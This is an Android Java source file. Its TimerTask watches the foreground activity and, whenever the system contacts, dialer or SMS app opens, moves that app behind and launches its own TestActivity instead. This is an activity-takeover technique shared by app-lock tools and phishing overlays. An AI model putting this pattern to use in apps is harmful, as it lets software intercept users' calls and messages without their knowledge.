package com.example.com.qiao.takeover;

import java.util.TimerTask;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;



public class TakeOverTask extends TimerTask {
	public static final String TAG = "TakeOverTask";
	private Context mContext;

	private ClassifyActivity mConstpackages;

	private boolean isRecent = false;
	private final String recentActivity = "com.android.systemui.recent";

	private ActivityManager mActivityManager;

	public TakeOverTask(Context context) {
		mContext = context;
		mConstpackages = new ClassifyActivity(context);
		mActivityManager = (ActivityManager) context
				.getSystemService("activity");
	}

	@Override
	public synchronized void run() {
		ComponentName topActivity = mActivityManager.getRunningTasks(1).get(0).topActivity;
		
		String packageName = topActivity.getPackageName();
		String className = topActivity.getClassName().toLowerCase();
		Log.e(packageName, className);
		if (className.contains(recentActivity)) {

			isRecent = true;
			return;

		}
	
		if (mConstpackages.isContactOrDialOrMms(packageName,className)) {

			if (isRecent)
				return;

			mActivityManager.moveTaskToFront(mActivityManager
					.getRunningTasks(2).get(1).id,
					ActivityManager.MOVE_TASK_NO_USER_ACTION);
			
			ComponentName orginActivity = mActivityManager.getRecentTasks(
					Integer.MAX_VALUE, mActivityManager.RECENT_WITH_EXCLUDED)
					.get(0).origActivity;
		

			try {
				Thread.sleep(200);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		
			if (mConstpackages.isMmsActivity(packageName, className)) {
				Intent intent = new Intent();
				intent.setClass(mContext, TestActivity.class);

				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

				intent.putExtra("type", "MmsActivity");
				mContext.startActivity(intent);
				return;
			}
			
			
			if (orginActivity != null) {
				Log.e("manActivity", "orginActivity != null");
				mConstpackages.isAlias = true;
			}
			if (mConstpackages.isAlias) {
				if (orginActivity != null) {
					className = orginActivity.getClassName().toLowerCase();
				} else
					className = null;

			}
			Log.e("manActivity", "className：："+className);
			if (mConstpackages.isDialActivity(packageName, className)) {
				Intent intent = new Intent();
				intent.setClass(mContext, TestActivity.class);

				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

				intent.putExtra("type", "DialActivity");
				mContext.startActivity(intent);

			}

			if ((mConstpackages.isContactActivity(packageName, className))) {

				Intent intent = new Intent();
				intent.setClass(mContext, TestActivity.class);
				intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				intent.putExtra("type", "ContactActivity");
				
				mContext.startActivity(intent);
			}
			return;
		}
		isRecent = false;
	}

}
